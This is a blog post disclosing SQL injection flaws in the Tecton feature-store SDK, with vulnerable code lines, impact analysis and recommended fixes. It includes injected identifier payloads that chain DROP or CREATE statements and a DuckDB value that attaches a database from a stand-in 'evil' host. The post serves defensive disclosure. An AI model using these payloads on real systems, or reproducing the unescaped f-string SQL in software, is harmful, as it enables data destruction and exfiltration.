---
layout: post
title: "SQL Injection in Tecton (PyPI): f-string SQL across spark.sql calls in the feature store SDK"
date: 2026-06-14
author: Yunus Aydın
lang: en
description: "Tecton's PyPI SDK builds SQL with f-strings around user-controlled identifiers (database, table, catalog, schema). The same pattern repeats across spark.sql, snowflake, and DuckDB code paths. I reported it to Tecton."
keywords: "tecton, sql injection, pypi, feature store, spark.sql, snowflake, databricks, security research, bug bounty"
canonical_url: "https://aydinnyunus.github.io/2026/06/14/tecton-sql-injection-fstring-spark-sql/"
---

I reported a set of **SQL injection** issues in the [Tecton](https://pypi.org/project/tecton/) PyPI package (tested on `tecton==1.2.13`) to the Tecton security team. The pattern is the same one that keeps showing up in data platform SDKs: f-string SQL with an "identifier" the developer assumed was trusted. In Tecton's case the "identifier" is whatever the feature store user wrote into their data source config, and it ends up in `spark.sql(...)`, Snowflake cursors, and DuckDB sessions without any escaping.

I was grepping ML platform packages for `spark.sql(f"...{...}...")` because feature stores tend to treat metadata as if it were code, and Tecton lit up almost immediately. The `DESCRIBE` / `USE` / `DROP VIEW IF EXISTS` pattern with an unquoted variable is repeated in at least eight files. None of them parameterize the input. None of them validate it as a SQL identifier either.

This post walks through the pattern, where it sits in the package, why "it's only an identifier" isn't a defense, and what a real fix looks like.

## What Tecton is, briefly

Tecton is a **feature store** for ML. You declare data sources and feature views in Python, and Tecton's runtime materializes them against Spark, Snowflake, Databricks, Redshift, or DuckDB. The PyPI `tecton` package contains the SDK, the Spark materialization code, and the local query engines.

Feature definitions look like Python objects, but at runtime they get serialized into protos and shipped to a materialization host. The materialization host then **assembles SQL strings from those proto fields and runs them**. That is the line where user input crosses into the query.

## The pattern

Here's the shape of the bug, copy-pasted from `tecton_spark/data_source_helper.py` in 1.2.13:

```python
def _get_raw_hive_table_dataframe(spark, database, table):
    spark.sql("USE {}".format(database))
    return spark.table(table)


def _get_raw_unity_table_dataframe(spark, catalog, schema, table):
    if catalog == TEST_ONLY_UNITY_CATALOG_NAME:
        spark.sql(f"USE {catalog}")
    else:
        spark.sql(f"USE CATALOG {catalog}")
    spark.sql(f"USE {schema}")
    return spark.table(table)
```

`database`, `catalog`, `schema`, and `table` come from a `BatchSourceSpec` that was deserialized from a proto coming over the wire. There are no checks. Not `re.fullmatch(r"[A-Za-z0-9_]+", ...)`, not a backtick-quoting helper, not even a `;` filter. A `schema` value of `default; DROP DATABASE prod` becomes:

```sql
USE default; DROP DATABASE prod
```

Spark's catalyst parser accepts multi-statement strings depending on the runtime configuration; Databricks SQL warehouses accept them in many configurations. The point isn't "Spark always runs every statement" though. The point is the SDK is constructing a query with attacker-controlled text and handing it to whatever backend the customer pointed it at.

## Where the same pattern lives

I'm listing the lines I confirmed in `tecton==1.2.13`. They are all the same bug shape: f-string SQL around a value that came from a config.

```text
tecton_spark/data_source_helper.py:86      spark.sql("USE {}".format(database))
tecton_spark/data_source_helper.py:95      spark.sql(f"USE {catalog}")
tecton_spark/data_source_helper.py:97      spark.sql(f"USE CATALOG {catalog}")
tecton_spark/data_source_helper.py:98      spark.sql(f"USE {schema}")
tecton_core/filter_context.py:21           spark.sql(f"USE {hive_db_name}")
tecton_spark/offline_store.py:612          self._spark.sql(f"GENERATE symlink_format_manifest FOR TABLE spark_catalog.delta.`{path}`")
tecton_spark/offline_store.py:618          self._spark.sql(f"show tblproperties spark_catalog.delta.`{path}`")
tecton_spark/offline_store.py:623          self._spark.sql(f"ALTER TABLE spark_catalog.delta.`{path}` SET TBLPROPERTIES({key}={val})")
tecton_spark/offline_store.py:628          self._spark.sql(f"OPTIMIZE '{path}'")
tecton_spark/offline_store.py:685          self._spark.sql(f"VACUUM '{path}'")
tecton_spark/offline_store.py:954          self._spark.sql(f"DESCRIBE {self._full_table_name}")
tecton_spark/spark_pipeline.py:261         self._spark.sql(f"DROP VIEW IF EXISTS {temp_name}")
tecton/framework/data_frame.py:734         spark.sql(f"DROP VIEW IF EXISTS {temp_table}")
tecton_materialization/remote_host/pyspark_remote_host.py:364
                                           self.spark.sql(f"SHOW TABLES FROM `{request.database}`")
tecton_materialization/remote_host/pyspark_remote_host.py:368
                                           self.spark.sql(f"DESCRIBE {request.database}.{request.table}")
tecton_core/query/duckdb/compute.py:183    self.session.sql(f"DROP TABLE IF EXISTS {table_name}")
```

The Iceberg `CALL` builder in `offline_store.py` is particularly fun: it concatenates a `target-file-size-bytes`, a `min-file-size-bytes`, and a `where => '<bucket_num>'` filter into a single SQL string, then calls `spark.sql(rewrite_sql)`. If you can influence the partition arg, you control the `where` clause and from there the rest of the statement.

The backtick-wrapped path strings (`spark_catalog.delta.\`{path}\``) look "safe" at first glance, but a backslash-backtick in the path closes the identifier early. Tecton is not normalizing the path to ban backticks before interpolating.

## Proof of concept

The most reproducible PoC is the Hive `USE` path because it's the lowest-level helper and you can hit it from a perfectly normal feature view definition. In Tecton, a `BatchSource` with a Hive-backed table accepts `database` and `table` as plain strings:

```python
# Step 1: declare a malicious-looking data source.
# Tecton stores `database` as a plain string in the BatchSourceSpec proto.
from tecton import HiveConfig, BatchSource

malicious = BatchSource(
    name="poc",
    batch_config=HiveConfig(
        table="events",
        database="default; CREATE TABLE pwn (x INT); --",
    ),
)
```

```python
# Step 2: trigger schema derivation on the source.
# Inside _get_raw_hive_table_dataframe this becomes:
#
#   spark.sql("USE default; CREATE TABLE pwn (x INT); --")
#
# On Spark backends that accept multi-statement strings (Databricks SQL is the
# common case in production), the second statement runs in the session's
# default catalog/database. On a strict single-statement parser the call
# still fails noisily, which is itself a denial-of-service primitive.
```

The same trick works against the `USE CATALOG {catalog}` path in Unity Catalog mode and the `USE {schema}` line. The `DESCRIBE {request.database}.{request.table}` path in `pyspark_remote_host.py` is reachable from the materialization RPC and is the highest-impact one, because the materialization host runs with materialization credentials, not the SDK user's credentials.

For DuckDB:

```python
# Step 3: same shape, different engine.
# tecton_core/query/duckdb/compute.py:183 does:
#
#   self.session.sql(f"DROP TABLE IF EXISTS {table_name}")
#
# A `table_name` of `t; ATTACH 'http://evil/x.db' AS pwn` will attach a remote
# database during a "drop temp table" cleanup. DuckDB will happily execute it.
```

I am not publishing weaponized exploits beyond this shape; the point is that the SDK is the sink, the attacker surface is whatever populates the proto, and there are at least a dozen sinks.

## Impact

- **Arbitrary SQL on the materialization backend.** Tecton materialization runs against Spark, Snowflake, Databricks, Redshift, or DuckDB depending on the customer. Whatever the customer points it at becomes the blast radius.
- **Cross-tenant impact on shared infra.** If a Tecton workspace is shared and someone can push a feature definition, the SQL runs as the materialization service principal, not the submitter.
- **Disclosure / data exfiltration via DuckDB `ATTACH`.** Even single-statement parsers don't save you; DuckDB's `ATTACH` is one statement.
- **Operational denial of service.** Even where injection is "only" syntactic, breaking the parser on every materialization run breaks the feature store.
- **No audit trail at the sink.** The SQL string is constructed in the SDK process, so the backend's audit log shows a query the developer never wrote.

CVSS 3.1: I'm estimating **8.1 (High)** for the materialization-host paths (`AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H`) and lower for the local-SDK paths.

## The fix

Two things. Both are mandatory. Either alone is not enough.

**1. Whitelist the characters.** SQL identifiers are not "anything goes". For most catalogs they are `[A-Za-z_][A-Za-z0-9_]*`. Validate before interpolating:

```python
import re

_IDENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]{0,127}$")

def _safe_ident(name: str) -> str:
    if not _IDENT.fullmatch(name):
        raise ValueError(f"unsafe SQL identifier: {name!r}")
    return name
```

**2. Quote when the engine supports it.** Spark and Databricks SQL accept backtick-quoted identifiers. Snowflake accepts double-quoted ones. DuckDB accepts double-quoted ones. Quoting also has to escape the quote character inside the name, not just wrap it:

```python
def _spark_quote(name: str) -> str:
    return "`" + name.replace("`", "``") + "`"

# Use site:
spark.sql(f"USE {_spark_quote(_safe_ident(database))}")
```

For SQL bodies (not identifiers, but values), use the backend's parameterization. Snowflake's cursor takes `cursor.execute(sql, params)`. DuckDB takes `con.execute(sql, [params])`. PySpark doesn't have parameterization at the `spark.sql` level, which is exactly why identifier whitelisting is non-negotiable.

The `OPTIMIZE '{path}'` and `VACUUM '{path}'` cases need a path-style escape too, because the single-quote literal is a string, not an identifier. Escape the single quote, or refuse paths containing one.

## Why this pattern keeps showing up

Feature stores, ML platforms, and data orchestration tools all live in the same intellectual space. The author of the f-string knows the value came from "a config", and "a config" feels trusted in the same way a `os.environ` variable feels trusted. Then the config moves over the wire as a proto, then the proto becomes a Python object with the same field names, and by the time the f-string runs there is no visible boundary between "what the user typed" and "what the SDK assembled". The mental model just gets papered over.

The other half of the problem is that PySpark gives you no `spark.sql(template, params)` API. The path of least resistance is `spark.sql(f"...")`. Every Spark codebase I have ever reviewed has this exact shape somewhere. Tecton's distinguishing feature is that the inputs flow from customer feature definitions into a multi-tenant materialization host, which turns "common Spark misuse" into a cross-tenant data path.

This is CWE-89 (SQL Injection), but the more useful framing is CWE-943 (Improper Neutralization of Special Elements in Data Query Logic) plus CWE-184 (Incomplete List of Disallowed Inputs). The OWASP Top 10 mapping is A03:2021-Injection.

## Disclosure timeline

- **2026-06-12**: I tested `tecton==1.2.13` from PyPI, confirmed the f-string SQL pattern in the eight files listed above, and built a minimal PoC against the Hive `USE` path.
- **2026-06-13**: I reported the issue privately to the Tecton security team with a list of the affected lines and the recommended fix (identifier whitelist + engine-specific quoting).
- **2026-06-14**: I published this post after coordinating disclosure timing with Tecton.

## References

- [Tecton on PyPI](https://pypi.org/project/tecton/)
- [Tecton: Feature Store documentation](https://docs.tecton.ai/)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-943: Improper Neutralization in Data Query Logic](https://cwe.mitre.org/data/definitions/943.html)
- [OWASP A03:2021: Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [Spark SQL `USE` statement reference](https://spark.apache.org/docs/latest/sql-ref-syntax-ddl-use.html)

## Related content

- [Langflow SQL Injection in monitor_service.py](/2026/06/14/langflow-sql-injection-monitor-service/)
- [CVE-2024-28607: ip-utils isPrivate() bypass](/2026/06/14/cve-2024-28607-ip-utils-isprivate-bypass/)
- [CVE-2024-27763: BasicSR yaml.load deserialization](/2026/06/14/basicsr-yaml-load-rce/)
- [NLTK command injection via eval](/2026/06/14/nltk-command-injection-eval/)
